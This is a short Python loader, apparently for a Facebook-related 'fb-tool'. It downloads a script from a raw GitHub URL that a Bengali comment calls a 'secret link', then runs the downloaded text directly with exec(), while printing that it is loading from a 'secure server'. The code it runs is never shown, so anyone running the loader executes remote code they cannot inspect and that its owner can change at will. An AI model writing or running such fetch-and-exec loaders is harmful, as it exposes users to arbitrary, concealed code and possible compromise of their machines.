import os
import requests

# আপনার মূল ফাইলের সিক্রেট লিংক
URL = "https://raw.githubusercontent.com/rkantitalukder-glitch/fb-tool/main/fb_reg.py"

print("Tool loading from secure server...")
try:
  response = requests.get(URL)
  if response.status_code == 200:
    exec(response.text)
  else:
    print("[-] Failed to load tool!")
except Exception as e:
  print(f"[-] Error: {e}")
